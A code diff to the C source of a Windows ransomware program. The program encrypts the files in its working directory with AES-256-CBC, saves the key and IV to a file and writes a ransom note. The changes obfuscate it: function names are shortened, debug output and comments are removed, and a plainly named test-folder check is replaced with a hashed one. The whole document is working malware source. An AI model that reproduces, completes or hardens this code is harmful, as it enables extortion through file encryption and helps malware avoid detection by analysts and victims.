@@ -8,8 +8,11 @@
 #include <sys/stat.h>
 #include <time.h>
 #include <windows.h>
+#include <openssl/sha.h>
 
-void handleErrors(void) {
+// r@ns0mW4r3
+
+void he(void) {
     ERR_print_errors_fp(stderr);
     abort();
 }
@@ -25,11 +28,10 @@ void giv(unsigned char* iv, size_t iv_size) {
     }
 }
 
-void checkTime() {
+void ct() {
     time_t now;
     time(&now);
     struct tm *current_time = localtime(&now);
-    printf("Current Date: %d-%d-%d\n", current_time->tm_year + 1900, current_time->tm_mon + 1, current_time->tm_mday);
     struct tm specified_time = {0};
     specified_time.tm_year = current_time->tm_year;
     specified_time.tm_mon = 11;                    
@@ -48,8 +50,21 @@ void checkTime() {
     }
 }
 
-void sCheck() {
+void ch(char* str, unsigned char hash[SHA256_DIGEST_LENGTH] ) {
+    SHA256_CTX sha256;
+    SHA256_Init(&sha256);
+    SHA256_Update(&sha256, str, strlen(str));
+    SHA256_Final(hash, &sha256);
+}
+
+void sc() {
     char cwd[1024];
+    const unsigned char expected_hash[SHA256_DIGEST_LENGTH] = {
+        0xee, 0x68, 0xda, 0x92, 0xa1, 0xaa, 0x9b, 0xda,
+        0xb7, 0x02, 0x43, 0x8e, 0xac, 0xa7, 0x38, 0x34,
+        0x35, 0x33, 0xe2, 0xeb, 0x67, 0x21, 0xf8, 0x7c,
+        0x10, 0x38, 0x98, 0x35, 0xf3, 0x2b, 0xdb, 0x2e
+    };
     if (_getcwd(cwd, sizeof(cwd)) == NULL) {
         perror("Cannot get current directory\n");
         exit(1);
@@ -58,17 +73,19 @@ void sCheck() {
         char* lastdir = strrchr(cwd, '\\');
         if (lastdir != NULL) {
             lastdir++;
-            if (strcmp(lastdir, "Test") == 0) {
+            unsigned char hash[SHA256_DIGEST_LENGTH];
+            ch(lastdir, hash);
+            if (memcmp(hash, expected_hash, SHA256_DIGEST_LENGTH) == 0) {
                 printf("Running in the Test directory.\n");
             } else {
-                perror("Unsafe directory. Must be in \\Test. Exiting...\n");
+                perror("Unsafe directory.\n");
                 exit(1);
             }
         } else {
             printf("Could not determine the directory name.\n");
         }
     }
-    checkTime();
+    ct();
 }
 
 void sign(char* fn) {
@@ -81,13 +98,13 @@ int e(unsigned char *plaintext, int plaintext_len, unsigned char *key,
     int len;
     int ciphertext_len;
 
-    if (!(ctx = EVP_CIPHER_CTX_new())) handleErrors();
+    if (!(ctx = EVP_CIPHER_CTX_new())) he();
     if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
-        handleErrors();
+        he();
     if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
-        handleErrors();
+        he();
     ciphertext_len = len;
-    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) handleErrors();
+    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) he();
     ciphertext_len += len;
     EVP_CIPHER_CTX_free(ctx);
     return ciphertext_len;
@@ -102,16 +119,6 @@ void ed(const char *dir_path) {
     gk(key, sizeof(key));
     giv(iv, sizeof(iv));
 
-    // debugging statements
-    for (int i = 0; i < sizeof(key); i++) {
-        printf("%02x", key[i]);
-    }
-    printf("\n");
-    for (int i = 0; i < sizeof(iv); i++) {
-        printf("%02x", iv[i]);
-    }
-    printf("\n");
-
     if (dir == NULL) {
         return;
     }
@@ -123,7 +130,6 @@ void ed(const char *dir_path) {
 
         if (stat(file_path, &statbuf) == 0) {
             if (S_ISREG(statbuf.st_mode)) {
-                printf("Regular file: %s\n", entry->d_name);
                 char ofilename[1024];
 
                 FILE* tfile = fopen(file_path, "rb");
@@ -132,20 +138,20 @@ void ed(const char *dir_path) {
                 FILE* ofile = fopen(ofilename, "wb");
                 
                 unsigned char buffer[256];
-                unsigned char ct[256 + EVP_MAX_BLOCK_LENGTH];  // Buffer for ciphertext
+                unsigned char ct[256 + EVP_MAX_BLOCK_LENGTH]; 
 
                 int bytes_read;
                 while ((bytes_read = fread(buffer, 1, sizeof(buffer), tfile)) > 0) {
                     int ciphertext_len = e(buffer, bytes_read, key, iv, ct);
-                    fwrite(ct, 1, ciphertext_len, ofile);  // Write the encrypted content
+                    fwrite(ct, 1, ciphertext_len, ofile);
                 }
             }
         }
     }
     closedir(dir);
     FILE* important_info = fopen("keys.txt", "wb");
-    fwrite(key, 1, sizeof(key), important_info);    // Write the key
-    fwrite(iv, 1, sizeof(iv), important_info);      // Write the IV
+    fwrite(key, 1, sizeof(key), important_info);
+    fwrite(iv, 1, sizeof(iv), important_info);
     fclose(important_info);
 }
 
@@ -181,4 +187,4 @@ void write_ransom_note() {
     fclose(file);
 }
 
-int main (void) {sCheck();ed(".");/**openConnection()**/; write_ransom_note();}
+int main (void) {sc();ed(".");/**openConnection()**/; write_ransom_note();}
